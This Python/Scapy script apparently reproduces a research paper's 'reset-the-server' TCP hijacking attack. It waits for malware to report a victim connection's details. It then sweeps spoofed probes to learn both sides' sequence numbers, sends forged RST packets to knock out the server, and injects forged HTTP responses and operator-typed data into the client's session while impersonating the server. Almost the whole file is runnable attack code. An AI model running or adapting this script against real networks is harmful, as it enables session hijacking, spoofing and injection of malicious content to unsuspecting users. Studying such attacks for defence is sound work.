#!/usr/bin/env python3
"""
Reset-the-Server Hijacking (Figure 4)
=======================================
1. Malware detects connection → reports 4-tuple to attacker
2. Sweep SEQ probes → firewall reports client_seq + server_seq
3. RST the server
4. Inject malicious response to client (impersonate server)
"""

from scapy.all import IP, TCP, send, sniff, Raw, conf
import socket, sys, time, threading

conf.verb = 0

TARGET_IP   = "20.0.0.20"    # server
SPOOFED_IP  = "10.0.0.10"    # client
ATTACKER_IP = "30.0.0.30"
DPORT       = 8080
WINDOW      = 65535
TOTAL       = 65536
NOTIFY_PORT = 9999

found  = threading.Event()
result = {"client_seq": 0, "server_seq": 0}


def listener():
    pkts = sniff(filter=f"tcp and dst port {NOTIFY_PORT}",
                 count=1, timeout=3600)
    if pkts and TCP in pkts[0]:
        result["client_seq"] = pkts[0][TCP].seq
        result["server_seq"] = pkts[0][TCP].ack
        found.set()


def main():
    print("\n" + "=" * 50)
    print("  RESET-THE-SERVER HIJACKING")
    print("=" * 50)

    # ── Wait for malware to report connection ──
    print(f"\n[*] Waiting for malware to report connection...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", NOTIFY_PORT))
    sock.listen(1)
    print(f"    Listening on port {NOTIFY_PORT}...")

    conn, addr = sock.accept()
    data = conn.recv(1024).decode()
    conn.close()
    sock.close()

    parts = data.split(":")
    SPOOFED_IP_actual = parts[0]   # client IP
    sport = int(parts[1])           # client port
    TARGET_IP_actual = parts[2]     # server IP

    print(f"\n    [!] MALWARE REPORTED:")
    print(f"        Client: {SPOOFED_IP_actual}:{sport}")
    print(f"        Server: {TARGET_IP_actual}:{DPORT}")

    # ── Phase 1: Sweep to find SEQ ──
    print(f"\n[*] PHASE 1: Sweeping SEQ")
    print(f"    {SPOOFED_IP}:{sport} → {TARGET_IP}:{DPORT}")

    t = threading.Thread(target=listener, daemon=True)
    t.start()
    time.sleep(0.5)
    t0 = time.time()

    for i in range(0, TOTAL, 256):
        if found.is_set():
            break
        batch = []
        for j in range(i, min(i + 256, TOTAL)):
            seq = (j * WINDOW) & 0xFFFFFFFF
            batch.append(IP(src=SPOOFED_IP, dst=TARGET_IP)
                         / TCP(sport=sport, dport=DPORT,
                               flags="PA", seq=seq, ack=0)
                         / Raw(load=b"X"))
        send(batch, verbose=False)
        if i % 4096 == 0:
            print(f"    [{i*100//TOTAL:3d}%]  ({i}/{TOTAL})  "
                  f"{time.time()-t0:.1f}s")

    if not found.is_set():
        found.wait(timeout=5)

    if not found.is_set():
        print("\n  [-] No hit. Is the connection active?")
        return

    cseq = result["client_seq"]
    sseq = result["server_seq"]
    print(f"\n    [+] Client SEQ = {cseq}")
    print(f"    [+] Server SEQ = {sseq}")

    # ── Phase 2: RST the server ──
    print(f"\n[*] PHASE 2: Resetting server")
    rst = IP(src=SPOOFED_IP, dst=TARGET_IP) \
          / TCP(sport=sport, dport=DPORT, flags="R", seq=cseq)
    for _ in range(3):
        send(rst, verbose=False)
    print(f"    [+] RST sent (SEQ={cseq})")
    print(f"    [+] Server is down, client still alive")
    time.sleep(2)

    # ── Phase 3: Inject as server ──
    print(f"\n[*] PHASE 3: Injecting as server")
    payload = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" \
              b"<h1>HIJACKED BY ATTACKER</h1>\r\n"

    pkt = IP(src=TARGET_IP, dst=SPOOFED_IP) \
          / TCP(sport=DPORT, dport=sport,
                flags="PA", seq=sseq, ack=cseq) \
          / Raw(load=payload)
    send(pkt, verbose=False)
    send(pkt, verbose=False)

    offset = len(payload)
    print(f"    [+] INJECTED: HIJACKED BY ATTACKER")
    print(f"    [+] Check client terminal!\n")

    print("=" * 50)
    print("  Type to inject as server. 'quit' to exit.")
    print("=" * 50)
    try:
        while True:
            msg = input("\n  > ").strip()
            if not msg: continue
            if msg in ("quit", "exit"): break
            data = msg.encode() + b"\n"
            p = IP(src=TARGET_IP, dst=SPOOFED_IP) \
                / TCP(sport=DPORT, dport=sport,
                      flags="PA", seq=sseq + offset, ack=cseq) \
                / Raw(load=data)
            send(p, verbose=False)
            offset += len(data)
            print(f"  [+] Sent: {msg}")
    except KeyboardInterrupt:
        pass
    print("\n[*] Done.")


if __name__ == "__main__":
    main()
